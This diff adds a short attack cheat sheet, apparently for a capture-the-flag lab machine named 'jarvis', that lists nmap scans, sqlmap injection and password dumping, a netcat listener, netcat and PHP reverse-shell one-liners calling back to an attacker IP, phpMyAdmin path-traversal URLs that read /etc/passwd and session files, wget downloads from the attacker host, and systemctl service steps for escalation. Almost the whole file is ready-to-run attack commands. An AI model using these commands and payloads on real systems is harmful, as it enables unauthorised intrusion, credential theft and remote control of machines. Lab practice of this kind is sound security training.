@@ -1,0 +1,34 @@
+ping -c 2 10.10.10.143
+
+nmap -sC -sV -oN jarvis.nmap 10.10.10.143  
+
+[sqlmap]
+sqlmap --batch --delay 2 --random-agent -u 'http://10.10.10.143/room.php?cod=1'
+sqlmap --password --batch --delay 2 --random-agent -u 'http://10.10.10.143/room.php?cod=1'
+
+[Listener]
+nc -nlvp [PORT]
+
+[reverse shell]
+nc [IP] [PORT] -e /bin/bash
+
+[php reverse shell]
+<?php $sock=fsockopen("YOUR_IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
+
+[URLS]
+http://10.10.10.143/phpmyadmin/index.php?target=sql.php?/../../../../../../etc/passwd
+http://10.10.10.143/phpmyadmin/index.php?target=sql.php?/../../../../../../var/lib/php/sessions/sess_YOUR-SESSION-ID
+
+[python webserver]
+python -m SimpleHTTPServer [PORT]
+
+[wget]
+wget http://YOUR_IP:PORT/file_name
+
+[Making a file executable]
+chmod +x [FILE]
+
+[systemctl]
+systemctl link /full/path/to/service.file
+systemctl enable --now /full/path/to/service.file
+systemctl restart service
